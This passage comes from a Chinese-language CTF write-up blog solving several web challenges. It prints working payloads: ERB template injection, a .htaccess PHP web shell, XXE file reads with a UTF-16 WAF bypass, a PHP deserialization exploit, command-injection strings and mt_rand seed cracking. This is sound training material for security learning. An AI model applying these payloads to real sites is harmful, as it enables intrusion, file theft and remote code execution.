class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token symbol&#34;&gt;:SECRET&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;match&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token regex-literal&#34;&gt;&lt;span class=&#34;token regex&#34;&gt;/[0-9a-z]+/&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token delimiter punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;      puts &lt;span class=&#34;token constant&#34;&gt;ENV&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string-literal&#34;&gt;&lt;span class=&#34;token string&#34;&gt;&#34;FLAG&#34;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;end&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token keyword&#34;&gt;end&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;这里要是 SECRET 参数存在则对其进行匹配，匹配到了就输出 flag&lt;/p&gt;
&lt;p&gt;但这里既然有匹配，就可以用全局变量读出来了，也就是用 $` 来读取匹配前的内容&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;../images/%5BSCTF2019%5DFlagShop/4.png&#34; alt=&#34;4&#34;&gt;&lt;/p&gt;
&lt;p&gt;构造下 payload：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;/work?SECRET=&amp;amp;name=&amp;lt;%=$&#39;%&amp;gt;&amp;amp;do=&amp;lt;%=$&#39;%&amp;gt; is working
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;../images/%5BSCTF2019%5DFlagShop/5.png&#34; alt=&#34;5&#34;&gt;&lt;/p&gt;
&lt;p&gt;直接使用好像不行。。&lt;/p&gt;
&lt;p&gt;要把里面内容换位十六进制&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;/work?SECRET=&amp;amp;name=%3c%25%3d%24%27%25%3e&amp;amp;do=%3c%25%3d%24%27%25%3e%20is%20working
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;../images/%5BSCTF2019%5DFlagShop/6.png&#34; alt=&#34;6&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;../images/%5BSCTF2019%5DFlagShop/7.png&#34; alt=&#34;7&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;../images/%5BSCTF2019%5DFlagShop/8.png&#34; alt=&#34;8&#34;&gt;&lt;/p&gt;
&lt;p&gt;又回显了一个 jwt 解码一下&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;../images/%5BSCTF2019%5DFlagShop/9.png&#34; alt=&#34;9&#34;&gt;&lt;/p&gt;
&lt;p&gt;参考链接：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9jbmJsb2dzLmNvbS9jMGQxL3AvMTYxMTkzOTMuaHRtbA==&#34;&gt;https://cnblogs.com/c0d1/p/16119393.html&lt;/span&gt;&lt;/p&gt;

 &lt;h2 id=&#34;羊城杯2020easyphp&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#羊城杯2020easyphp&#34;&gt;#&lt;/a&gt; [羊城杯 2020] easyphp&lt;/h2&gt;
&lt;p&gt;和 [XNUCA2019Qualifier] EasyPHP 基本一样，唯一的区别就是少了 include_once 导致没办法通过 error_log 来做，预期解应该就是那道题的非预期。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt; &amp;lt;?php
    $files = scandir(&#39;./&#39;); 
    foreach($files as $file) &amp;#123;
        if(is_file($file))&amp;#123;
            if ($file !== &amp;quot;index.php&amp;quot;) &amp;#123;
                unlink($file);
            &amp;#125;
        &amp;#125;
    &amp;#125;
    if(!isset($_GET[&#39;content&#39;]) || !isset($_GET[&#39;filename&#39;])) &amp;#123;
        highlight_file(__FILE__);
        die();
    &amp;#125;
    $content = $_GET[&#39;content&#39;];
    if(stristr($content,&#39;on&#39;) || stristr($content,&#39;html&#39;) || stristr($content,&#39;type&#39;) || stristr($content,&#39;flag&#39;) || stristr($content,&#39;upload&#39;) || stristr($content,&#39;file&#39;)) &amp;#123;
        echo &amp;quot;Hacker&amp;quot;;
        die();
    &amp;#125;
    $filename = $_GET[&#39;filename&#39;];
    if(preg_match(&amp;quot;/[^a-z\.]/&amp;quot;, $filename) == 1) &amp;#123;
        echo &amp;quot;Hacker&amp;quot;;
        die();
    &amp;#125;
    $files = scandir(&#39;./&#39;); 
    foreach($files as $file) &amp;#123;
        if(is_file($file))&amp;#123;
            if ($file !== &amp;quot;index.php&amp;quot;) &amp;#123;
                unlink($file);
            &amp;#125;
        &amp;#125;
    &amp;#125;
    file_put_contents($filename, $content . &amp;quot;\nHello, world&amp;quot;);
?&amp;gt; 

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;文件包含，其中文件内容不能有&lt;strong&gt; on|html|type|flag|upload|file&lt;/strong&gt; 关键字，文件名只能有字母和点，且每次访问都会删除当前目录除 index.php 之外的文件。&lt;/p&gt;
&lt;p&gt;写个一句话，发现没有被解析，可能是 php 解析配置 &lt;code&gt;php_flag engine&lt;/code&gt;  关闭了。配置的问题还是要回归配置文件，虽然主配置文件中关闭了 php 解析，但.htaccess 优先度高于主配置文件，因此我们可以使用.htaccess 执行 php 代码。&lt;/p&gt;
&lt;h3 id=&#34;法一&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#法一&#34;&gt;#&lt;/a&gt; &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly90eXNraWxsLmdpdGh1Yi5pby9wb3N0cy95Y2IyMDIwLyNjb250ZW50czolRTYlQjMlOTUlRTQlQjglODA=&#34;&gt;法一&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;利用.htaccess 构成后门&lt;/strong&gt;，payload：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;?filename=.htaccess&amp;amp;content=php_value%20auto_prepend_fi\%0ale%20&amp;quot;.htaccess&amp;quot;%0a%23%20&amp;lt;?php system($_POST[&amp;quot;cmd&amp;quot;]);?&amp;gt;\

&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;法二&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#法二&#34;&gt;#&lt;/a&gt; &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly90eXNraWxsLmdpdGh1Yi5pby9wb3N0cy95Y2IyMDIwLyNjb250ZW50czolRTYlQjMlOTUlRTQlQkElOEM=&#34;&gt;法二&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;通过 php_value 来设置 preg_macth 正则回溯次数&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;payload:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;?filename=.htaccess&amp;amp;content=php_value%20pcre.backtrack_limit%200%0aphp_value%20pcre.jit%200%0a%23\

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;使 preg_match 返回 False，继而绕过了正则判断，然后的过程由于源码没有使用 include，所以应该还是利用.htaccess 写入 php 代码自包含吧，那和前一种方法差不多 (自认为)。&lt;/p&gt;
&lt;p&gt;参考链接：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly90eXNraWxsLmdpdGh1Yi5pby9wb3N0cy95Y2IyMDIwLyMlRTYlQjMlOTUlRTQlQjglODA=&#34;&gt;https://tyskill.github.io/posts/ycb2020/# 法一&lt;/span&gt;&lt;/p&gt;

 &lt;h2 id=&#34;bsidescf-2019svgmagic&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#bsidescf-2019svgmagic&#34;&gt;#&lt;/a&gt; [BSidesCF 2019]SVGMagic&lt;/h2&gt;
&lt;p&gt;标题说把 SVG 转为 PNG&lt;/p&gt;
&lt;p&gt;SVG 是一种用 XML 定义的语言，SVG 图形是可交互的和动态的，可以在 SVG 文件中嵌入动画元素或通过脚本来定义动画。&lt;/p&gt;
&lt;p&gt;也就是说这里的 SVG 是个 XML, 并且存在可控的内容，那么自然就会想到 XXE。&lt;/p&gt;
&lt;p&gt;究极详细讲解：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vdnVscy8xNzU0NTEuaHRtbA==&#34;&gt;https://www.freebuf.com/vuls/175451.html&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;我的理解是：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;首先我们要知道，XML 被设计用来传输和存储数据。
然后这个漏洞就是利用了，应用程序在解析XML输入时，没有禁止外部实体的加载。
就拿下面的这个来说&amp;lt;!ENTITY file SYSTEM &amp;quot;file:///proc/self/cwd/flag.txt&amp;quot; &amp;gt;，这个就是外部实体，加载了flag.txt,然后输出，
也就是：应该是实体引用，把加载的东西放出来
&amp;lt;svg height=&amp;quot;100&amp;quot; width=&amp;quot;1000&amp;quot;&amp;gt;
  &amp;lt;text x=&amp;quot;10&amp;quot; y=&amp;quot;20&amp;quot;&amp;gt;&amp;amp;file;&amp;lt;/text&amp;gt;
&amp;lt;/svg&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;UTF-8&amp;quot;?&amp;gt;
&amp;lt;!DOCTYPE note [
&amp;lt;!ENTITY file SYSTEM &amp;quot;file:///proc/self/cwd/flag.txt&amp;quot; &amp;gt;
]&amp;gt;
&amp;lt;svg height=&amp;quot;100&amp;quot; width=&amp;quot;1000&amp;quot;&amp;gt;
  &amp;lt;text x=&amp;quot;10&amp;quot; y=&amp;quot;20&amp;quot;&amp;gt;&amp;amp;file;&amp;lt;/text&amp;gt;
&amp;lt;/svg&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;../images/%5BBSidesCF2019%5DSVGMagic/2.png&#34; alt=&#34;2&#34;&gt;&lt;/p&gt;

 &lt;h2 id=&#34;极客大挑战2020greatphp&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#极客大挑战2020greatphp&#34;&gt;#&lt;/a&gt; [极客大挑战 2020] Greatphp&lt;/h2&gt;
&lt;p&gt;源码：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;?php
error_reporting(0);
class SYCLOVER &amp;#123;
    public $syc;
    public $lover;

    public function __wakeup()&amp;#123;
        if( ($this-&amp;gt;syc != $this-&amp;gt;lover) &amp;amp;&amp;amp; (md5($this-&amp;gt;syc) === md5($this-&amp;gt;lover)) &amp;amp;&amp;amp; (sha1($this-&amp;gt;syc)=== sha1($this-&amp;gt;lover)) )&amp;#123;
           if(!preg_match(&amp;quot;/\&amp;lt;\?php|\(|\)|\&amp;quot;|\&#39;/&amp;quot;, $this-&amp;gt;syc, $match))&amp;#123;
               eval($this-&amp;gt;syc);
           &amp;#125; else &amp;#123;
               die(&amp;quot;Try Hard !!&amp;quot;);
           &amp;#125;

        &amp;#125;
    &amp;#125;
&amp;#125;

if (isset($_GET[&#39;great&#39;]))&amp;#123;
    unserialize($_GET[&#39;great&#39;]);
&amp;#125; else &amp;#123;
    highlight_file(__FILE__);
&amp;#125;

?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这一个条件，在普通的题目里，只需要用数组绕过即可，但是这里是在类中，该怎么绕过呢？&lt;/p&gt;
&lt;p&gt;我们可以使用含有 __toString 方法的 php 内置类来绕过，用的两个比较多的内置类是 Exception 和 Error ，他们之中有一个 __toString fangfa , 当类被当作字符串处理时，就会调用这个函数，以 Error 类为例，我们可控当触发他的__toString 方法时会发生什么？&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;../images/%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982020%5DGreatphp/1.png&#34; alt=&#34;1&#34;&gt;&lt;/p&gt;
&lt;p&gt;发现会以字符串的形式 输出当前报错，包含当前的错误信息， 以及他出现错误的行号 (3)，从而传入 Error (“payload”,9) 中的错误代码 “9 ” 则没有被输出出来，再来看看如何 绕过 md5 以及 sha1.&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;../images/%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982020%5DGreatphp/2.png&#34; alt=&#34;2&#34;&gt;&lt;/p&gt;
&lt;p&gt;可见 &lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math xmlns=&#34;http://www.w3.org/1998/Math/MathML&#34;&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mtext&gt;和&lt;/mtext&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;a 和&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.68333em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;和&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt; b 这两个对象本身是不同的。但是  __toString 方法返回的结果是相同的，这里之所以需要在同一行是因为 __toString 返回的数据包含当前的行号&lt;/p&gt;
&lt;p&gt;Exception 类与 Error 类的使用和结果完全一样，只不过 Exception 类适用于 PHP 5 和 7 而 Error 只适用于 php7&lt;/p&gt;
&lt;p&gt;我们可以将题目代码中的 $syc 和 $lover 分别声明为类似上面的内置类对象，让着两个对象本身不同 (传入的错误代码即可)， 但是 __toString 方法输出的结果相同即可。&lt;/p&gt;
&lt;p&gt;由于题目 用 preg_match 过滤了小括号 无法调用函数，所以我们尝试 直接 include “/flag” 将 flag 包含进来即可，由于过滤了引号，我们直接用 url 取反绕过即可。&lt;/p&gt;
&lt;p&gt;exp：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;?php
class SYCLOVER &amp;#123;
    public $syc;
    public $lover;
    public function __wakeup()&amp;#123;
        if( ($this-&amp;gt;syc != $this-&amp;gt;lover) &amp;amp;&amp;amp; (md5($this-&amp;gt;syc) === md5($this-&amp;gt;lover)) &amp;amp;&amp;amp; (sha1($this-&amp;gt;syc)=== sha1($this-&amp;gt;lover)) )&amp;#123;
           if(!preg_match(&amp;quot;/\&amp;lt;\?php|\(|\)|\&amp;quot;|\&#39;/&amp;quot;, $this-&amp;gt;syc, $match))&amp;#123;
               eval($this-&amp;gt;syc);
           &amp;#125; else &amp;#123;
               die(&amp;quot;Try Hard !!&amp;quot;);
           &amp;#125;


        &amp;#125;
    &amp;#125;

&amp;#125;
$str = &amp;quot;?&amp;gt;&amp;lt;?=include~&amp;quot;.urldecode(&amp;quot;%D0%99%93%9E%98&amp;quot;).&amp;quot;?&amp;gt;&amp;quot;;
$a=new Error($str,1);$b=new Error($str,2);
$c = new SYCLOVER();
$c-&amp;gt;syc = $a;
$c-&amp;gt;lover = $b;
echo(urlencode(serialize($c)));

?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;../images/%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982020%5DGreatphp/3.png&#34; alt=&#34;3&#34;&gt;&lt;/p&gt;
&lt;p&gt;总结：&lt;br&gt;
error 原生类 __toString 方法的结果是相同的。 记住行号也需要一样，他们的值是不一样的，但是呢， 结果的 md5 值是一样的，从而可以绕过 。执行 eval 函数，eval include /flag。&lt;/p&gt;
&lt;p&gt;对 php 原生类 有了些许了解，但还需要继续学习。&lt;/p&gt;

 &lt;h2 id=&#34;easybypass&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#easybypass&#34;&gt;#&lt;/a&gt; easybypass&lt;/h2&gt;
&lt;p&gt;源码：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt; &amp;lt;?php

highlight_file(__FILE__);

$comm1 = $_GET[&#39;comm1&#39;];
$comm2 = $_GET[&#39;comm2&#39;];


if(preg_match(&amp;quot;/\&#39;|\`|\\|\*|\n|\t|\xA0|\r|\&amp;#123;|\&amp;#125;|\(|\)|&amp;lt;|\&amp;amp;[^\d]|@|\||tail|bin|less|more|string|nl|pwd|cat|sh|flag|find|ls|grep|echo|w/is&amp;quot;, $comm1))
    $comm1 = &amp;quot;&amp;quot;;
if(preg_match(&amp;quot;/\&#39;|\&amp;quot;|;|,|\`|\*|\\|\n|\t|\r|\xA0|\&amp;#123;|\&amp;#125;|\(|\)|&amp;lt;|\&amp;amp;[^\d]|@|\||ls|\||tail|more|cat|string|bin|less||tac|sh|flag|find|grep|echo|w/is&amp;quot;, $comm2))
    $comm2 = &amp;quot;&amp;quot;;

$flag = &amp;quot;#flag in /flag&amp;quot;;

$comm1 = &#39;&amp;quot;&#39; . $comm1 . &#39;&amp;quot;&#39;;
$comm2 = &#39;&amp;quot;&#39; . $comm2 . &#39;&amp;quot;&#39;;

$cmd = &amp;quot;file $comm1 $comm2&amp;quot;;
system($cmd);
?&amp;gt;
cannot open `&#39; (No such file or directory) cannot open `&#39; (No such file or directory) 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;可以看到这里很清楚了，也就是在我们传的参数两边套上了双引号然后，拼接到 cmd 的后面这时考虑到引号闭合就好了直接上 payload&lt;/p&gt;
&lt;figure class=&#34;highlight ruby&#34;&gt;&lt;figcaption data-lang=&#34;ruby&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token operator&#34;&gt;?&lt;/span&gt;comm1&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;index&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;php&lt;span class=&#34;token string-literal&#34;&gt;&lt;span class=&#34;token string&#34;&gt;&#34;;dir /;&#34;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;amp;&lt;/span&gt;comm2&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token operator&#34;&gt;?&lt;/span&gt;comm1&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;index&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;php&lt;span class=&#34;token string-literal&#34;&gt;&lt;span class=&#34;token string&#34;&gt;&#34;;tac /f*;&#34;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;amp;&lt;/span&gt;comm2&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;直接出 flag&lt;/p&gt;

 &lt;h2 id=&#34;csawqual2019web_unagi&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#csawqual2019web_unagi&#34;&gt;#&lt;/a&gt; [CSAWQual2019]Web_Unagi&lt;/h2&gt;
&lt;p&gt;&lt;img data-src=&#34;../images/%E6%96%B0%E5%BB%BA%E6%96%87%E4%BB%B6%E5%A4%B9/1.png&#34; alt=&#34;1&#34;&gt;&lt;/p&gt;
&lt;p&gt;提示需要上传 xml 文件，flag 在 /flag 中。很容易联想到 XXE 漏洞来读取。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;?xml version=&#39;1.0&#39;?&amp;gt;
&amp;lt;!DOCTYPE users [
&amp;lt;!ENTITY xxe SYSTEM &amp;quot;file:///flag&amp;quot; &amp;gt;]&amp;gt;
&amp;lt;users&amp;gt;
    &amp;lt;user&amp;gt;
        &amp;lt;username&amp;gt;gg&amp;lt;/username&amp;gt;
        &amp;lt;password&amp;gt;passwd1&amp;lt;/password&amp;gt;
        &amp;lt;name&amp;gt;ggg&amp;lt;/name&amp;gt;
        &amp;lt;email&amp;gt;alice@fakesite.com&amp;lt;/email&amp;gt;  
        &amp;lt;group&amp;gt;CSAW2019&amp;lt;/group&amp;gt;
        &amp;lt;intro&amp;gt;&amp;amp;xxe;&amp;lt;/intro&amp;gt;
    &amp;lt;/user&amp;gt;
    &amp;lt;user&amp;gt;
        &amp;lt;username&amp;gt;bob&amp;lt;/username&amp;gt;
        &amp;lt;password&amp;gt;passwd2&amp;lt;/password&amp;gt;
        &amp;lt;name&amp;gt; Bob&amp;lt;/name&amp;gt;
        &amp;lt;email&amp;gt;bob@fakesite.com&amp;lt;/email&amp;gt;  
        &amp;lt;group&amp;gt;CSAW2019&amp;lt;/group&amp;gt;
        &amp;lt;intro&amp;gt;&amp;amp;xxe;&amp;lt;/intro&amp;gt;
    &amp;lt;/user&amp;gt;
&amp;lt;/users&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;上传显示 &lt;em&gt;WAF blocked uploaded file. Please try again&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;查了如何绕过 WAF 保护的 XXE 的资料：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;一个 xml 文档不仅可以用 UTF-8 编码，也可以用 UTF-16 (两个变体 - BE 和 LE)、UTF-32 (四个变体 - BE、LE、2143、3412) 和 EBCDIC 编码。&lt;/p&gt;
&lt;p&gt;在这种编码的帮助下，使用正则表达式可以很容易地绕过 WAF，因为在这种类型的 WAF 中，正则表达式通常仅配置为单字符集。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;用以下命令把上面的文本转为 16 进制：&lt;/p&gt;
&lt;p&gt;cat 1.xml &lt;strong&gt;|&lt;/strong&gt; iconv -f UTF-8 -t UTF-16BE &lt;strong&gt;&amp;gt;&lt;/strong&gt; x16.xml&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;../images/%E6%96%B0%E5%BB%BA%E6%96%87%E4%BB%B6%E5%A4%B9/2.png&#34; alt=&#34;2&#34;&gt;&lt;/p&gt;
&lt;p&gt;参考链接：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuc2hhd3Jvb3QuY2MvMTU2Lmh0bWw=&#34;&gt;https://www.shawroot.cc/156.html&lt;/span&gt;&lt;/p&gt;

 &lt;h2 id=&#34;mrctf2020ezaudit&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#mrctf2020ezaudit&#34;&gt;#&lt;/a&gt; [MRCTF2020]Ezaudit&lt;/h2&gt;
&lt;p&gt;打开题目是个漂亮的前端，扫一下发现 &lt;code&gt;www.zip&lt;/code&gt;  文件泄露，下载审计&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;?php 
header(&#39;Content-type:text/html; charset=utf-8&#39;);
error_reporting(0);
if(isset($_POST[&#39;login&#39;]))&amp;#123;
    $username = $_POST[&#39;username&#39;];
    $password = $_POST[&#39;password&#39;];
    $Private_key = $_POST[&#39;Private_key&#39;];
    if (($username == &#39;&#39;) || ($password == &#39;&#39;) ||($Private_key == &#39;&#39;)) &amp;#123;
        // 若为空,视为未填写,提示错误,并3秒后返回登录界面
        header(&#39;refresh:2; url=login.html&#39;);
        echo &amp;quot;用户名、密码、密钥不能为空啦,crispr会让你在2秒后跳转到登录界面的!&amp;quot;;
        exit;
&amp;#125;
    else if($Private_key != &#39;*************&#39; )
    &amp;#123;
        header(&#39;refresh:2; url=login.html&#39;);
        echo &amp;quot;假密钥，咋会让你登录?crispr会让你在2秒后跳转到登录界面的!&amp;quot;;
        exit;
    &amp;#125;

    else&amp;#123;
        if($Private_key === &#39;************&#39;)&amp;#123;
        $getuser = &amp;quot;SELECT flag FROM user WHERE username= &#39;crispr&#39; AND password = &#39;$password&#39;&amp;quot;.&#39;;&#39;; 
        $link=mysql_connect(&amp;quot;localhost&amp;quot;,&amp;quot;root&amp;quot;,&amp;quot;root&amp;quot;);
        mysql_select_db(&amp;quot;test&amp;quot;,$link);
        $result = mysql_query($getuser);
        while($row=mysql_fetch_assoc($result))&amp;#123;
            echo &amp;quot;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;quot;.$row[&amp;quot;username&amp;quot;].&amp;quot;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;quot;.$row[&amp;quot;flag&amp;quot;].&amp;quot;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;quot;;
        &amp;#125;
    &amp;#125;
    &amp;#125;

&amp;#125; 
// genarate public_key 
function public_key($length = 16) &amp;#123;
    $strings1 = &#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#39;;
    $public_key = &#39;&#39;;
    for ( $i = 0; $i &amp;lt; $length; $i++ )
    $public_key .= substr($strings1, mt_rand(0, strlen($strings1) - 1), 1);
    return $public_key;
  &amp;#125;

  //genarate private_key
  function private_key($length = 12) &amp;#123;
    $strings2 = &#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#39;;
    $private_key = &#39;&#39;;
    for ( $i = 0; $i &amp;lt; $length; $i++ )
    $private_key .= substr($strings2, mt_rand(0, strlen($strings2) - 1), 1);
    return $private_key;
  &amp;#125;
  $Public_key = public_key();
  //$Public_key = KVQP0LdJKRaV3n9D  how to get crispr&#39;s private_key???
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;根据最后一行提示，我们需要通过公钥找到私钥，这里使用了 mt_rand () 函数，具体可以看一下链接文章讲的很详细。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;爆破 seed&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;str1=&#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#39;
str2=&#39;KVQP0LdJKRaV3n9D&#39;
str3 = str1[::-1]
length = len(str2)
res=&#39;&#39;
for i in range(len(str2)):  
    for j in range(len(str1)):
        if str2[i] == str1[j]:
            res+=str(j)+&#39; &#39;+str(j)+&#39; &#39;+&#39;0&#39;+&#39; &#39;+str(len(str1)-1)+&#39; &#39;
            break
print(res)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;用 php_mt_seed 算出种子为 1775196155&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;../images/%5BMRCTF2020%5DEzaudit/2.png&#34; alt=&#34;2&#34;&gt;&lt;/p&gt;
&lt;p&gt;算出私钥&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;?php
mt_srand(1775196155);
//公钥
function public_key($length = 16) &amp;#123;
    $strings1 = &#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#39;;
    $public_key = &#39;&#39;;
    for ( $i = 0; $i &amp;lt; $length; $i++ )
    $public_key .= substr($strings1, mt_rand(0, strlen($strings1) - 1), 1);
    return $public_key;
&amp;#125;
//私钥
function private_key($length = 12) &amp;#123;

	$strings2 = &#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#39;;
	$private_key = &#39;&#39;;
	for ( $i = 0; $i &amp;lt; $length; $i++ )
	$private_key .= substr($strings2, mt_rand(0, strlen($strings2) - 1), 1);
	return $private_key;
&amp;#125;
echo public_key();
echo private_key();
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;index.php 中有一个 login.html 直接访问，输入账号密码私钥登录得到 flag（万能密码）&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;../images/%5BMRCTF2020%5DEzaudit/1.png&#34; alt=&#34;1&#34;&gt;&lt;/p&gt;
&lt;p&gt;end&lt;/p&gt;

 &lt;h2 id=&#34;wmctf2020make-php-great-again&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#wmctf2020make-php-great-again&#34;&gt;#&lt;/a&gt; [WMCTF2020]Make PHP Great Again&lt;/h2&gt;
&lt;p&gt;前言：&lt;/p&gt;
&lt;p&gt;关键字:[require_once|proc | 文件包含 | session|session.upload_progress]&lt;/p&gt;
